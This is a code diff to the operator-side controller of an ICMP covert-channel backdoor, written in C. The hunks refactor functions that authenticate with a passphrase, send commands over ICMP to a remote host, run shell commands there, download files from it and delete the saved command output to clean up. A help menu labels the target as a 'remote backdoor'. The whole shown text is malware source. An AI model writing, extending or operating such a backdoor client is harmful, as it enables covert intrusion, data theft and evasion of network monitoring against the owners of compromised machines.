@@ -71,8 +71,8 @@ int handle_hello(struct Configuration *c) {
 
     strcpy(send_pp->passphrase, c->password);
 
-    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, hello_len);
-    listen_icmp(1024, hello_len, c->interface, listen_res);
+    send_res = send_icmp(c, (void *)send_pp, hello_len);
+    listen_icmp(c, 1024, hello_len, listen_res);
     if (listen_res->is_response == 0xff && (strcmp(&listen_res->passphrase, c->password) == 0 && listen_res->pphdr.id == h_ctx->current_id)){
         h_ctx->current_id++;
 
@@ -102,9 +102,9 @@ int handle_goodbye(struct Configuration *c){
     send_pp->pphdr.seqid = h_ctx->current_id;
     send_pp->pphdr.payload_len = (uint16_t) gb_len - sizeof(struct ProtocolHeader);
     send_pp->pphdr.flags = (uint16_t) FLAG_GDBYE;
-    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, gb_len);
+    send_res = send_icmp(c, (void *)send_pp, gb_len);
     
-    listen_icmp(1024, gb_len, c->interface, listen_res);
+    listen_icmp(c, 1024, gb_len, listen_res);
     if (listen_res->is_response == 0xff && (listen_res->pphdr.flags & FLAG_GDBYE) == FLAG_GDBYE){
 
         free(send_pp);
@@ -139,9 +139,9 @@ int handle_download(struct Configuration *c, char * path){
     strcpy(send_pp->path, path);
     send_pp->mps = MPS - sizeof(struct ProtocolHeader);
 
-    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, ex_len);
+    send_res = send_icmp(c, (void *)send_pp, ex_len);
     
-    listen_icmp(1500, ex_len + MPS, c->interface, listen_res);
+    listen_icmp(c, 1500, ex_len + MPS, listen_res);
     if ((listen_res->flags & FLAG_FILE_DOWNLOAD) == FLAG_FILE_DOWNLOAD) {
         h_ctx->current_id++;
 
@@ -206,9 +206,9 @@ int handle_exec(struct Configuration *c, char * cmdline, bool interactive){
         strcat(send_pp->cmdline, " &> ");
         strcat(send_pp->cmdline, OUTPUT_FILE);
     }
-    send_res = send_icmp(c->src_addr, c->dst_addr, (void *)send_pp, ex_len);
+    send_res = send_icmp(c, (void *)send_pp, ex_len);
     
-    listen_icmp(1024, ex_len, c->interface, listen_res);
+    listen_icmp(c, 1024, ex_len, listen_res);
     if (listen_res->is_response == 0xff && (listen_res->pphdr.flags & FLAG_EXECUTE_COMMAND) == FLAG_EXECUTE_COMMAND){
         h_ctx->current_id++;
         
@@ -233,7 +233,7 @@ int handle_exec(struct Configuration *c, char * cmdline, bool interactive){
 void print_help() {
     printf("\nshell - Semi-interactive shell. Will save output to disk: whoami (>CONFIG.OUTPUT_FILE)\n");
     printf("exec - Execute single command, does not save output to disk\n");
-    printf("dowload - Download file on remote serer\n");
+    printf("dowload - Download file on remote server\n");
     printf("exit - Close session with remote backdoor\n");
     printf("help - Print this message\n\n");
 
@@ -287,11 +287,9 @@ int start_handler(struct Configuration *c) {
 
                 if (interaction_res == 0) {
 
-                    //printf("[INFO] Command executed successfully\n");
 
                     interaction_res = handle_exec(c, &rm_output_file, 0);
                     if (interaction_res == 0) {
-                        //printf("[INFO] Cleanup Successfull\n");
                     } else {
                         printf("[INFO] Cleanup Failed\n");
                     }
